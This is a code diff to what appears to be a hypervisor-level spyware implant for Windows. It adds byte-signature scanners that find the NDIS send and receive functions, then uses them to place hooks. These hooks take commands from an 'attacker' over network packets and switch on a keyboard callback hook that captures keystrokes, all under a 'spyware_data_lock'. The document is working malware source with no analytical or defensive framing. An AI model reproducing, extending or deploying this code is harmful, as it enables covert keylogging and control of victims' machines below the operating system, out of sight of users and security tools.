@@ -11,6 +11,29 @@
 #include <network/arp.h>
 #include <network/tcp.h>
 
+__attribute__((section(".vmm"))) uint64_t locate_ndisMSendNBLToMiniportInternal(uint64_t ndis){
+    byte_t sign[] = {
+        0x40, 0xb7, 0x02,                           // mov dil, 2
+        0x4c, 0x8b, 0xa1, 0xb8, 0x00, 0x00, 0x00    // mov r12, qword ptr [rcx+0B8h]
+    };
+
+    uint64_t ndisMSendNBLToMiniportInternal = find_signature(ndis, sign, 10) - 0x4e;
+
+    return ndisMSendNBLToMiniportInternal;
+}
+
+__attribute__((section(".vmm"))) uint64_t locate_NdisMIndicateReceiveNetBufferLists(uint64_t ndis){
+    byte_t sign[] = {
+        0x8b, 0x8f, 0x78, 0x0a, 0x00, 0x00,     // mov ecx, dword ptr [rdi+0A78h]
+        0x4c, 0x89, 0x6c, 0x24, 0x70,           // mov qword ptr [rsp+70h], r13
+        0xf6, 0xc1, 0x01                        // test cl, 1
+    };
+
+    uint64_t NdisMIndicateReceiveNetBufferLists = find_signature(ndis, sign, 14) - 0x77;
+
+    return NdisMIndicateReceiveNetBufferLists;
+}
+
 __attribute__((section(".vmm"))) 
 BOOL parse_net_buffer_list(uint64_t PNetBufferLists, uint64_t *PNetBuffer, uint64_t *PMdl){
     
@@ -143,7 +166,7 @@ void check_router_arp(byte_t *pkt){
 
     // Activate sending
     shared_cores_data.send_requests = TRUE;
-    hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
+    hook_function(guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
 
 }
 
@@ -165,7 +188,7 @@ BOOL check_if_attacker_msg(byte_t *pkt){
         shared_cores_data.send_requests = FALSE;
 
         // Activate keyboard hook
-        hook_function(guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET), &shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_x, shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_rw);
+        hook_function(guest_virtual_to_physical(shared_cores_data.functions.KeyboardClassServiceCallback), &shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_x, shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_rw);
         
         // remove the receive hook
         // *(uint16_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET) = PUSH_R12;
@@ -180,11 +203,11 @@ BOOL check_if_attacker_msg(byte_t *pkt){
         ReleaseLock(&shared_cores_data.spyware_data_lock);
 
         // Remove keyboard hook
-        *(uint8_t*)guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET) = PUSH_RBP;
+        *(uint8_t*)guest_virtual_to_physical(shared_cores_data.functions.KeyboardClassServiceCallback) = PUSH_RBP;
 
         // Start sending requests again
         shared_cores_data.send_requests = TRUE;
-        hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
+        hook_function(guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
 
         return TRUE;
     }
@@ -241,7 +264,7 @@ void handle_ndisMSendNBLToMiniportInternal_hook(vmexit_data_t *state){
             __vmwrite(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS, pin_based_ctls.value);
             __vmwrite(GUEST_VMX_PREEMPTION_TIMER, 0x2ffffff);
         }
-        *(byte_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET) = PUSH_RBP;
+        *(byte_t*)guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal) = PUSH_RBP;
 
         return;
 
@@ -278,7 +301,7 @@ void handle_ndisMSendNBLToMiniportInternal_hook(vmexit_data_t *state){
 
     // remove the hook and release the lock
     shared_cores_data.send_pending = FALSE;
-    *(byte_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET) = PUSH_RBP;
+    *(byte_t*)guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal) = PUSH_RBP;
     ReleaseLock(&shared_cores_data.spyware_data_lock);
 
 }
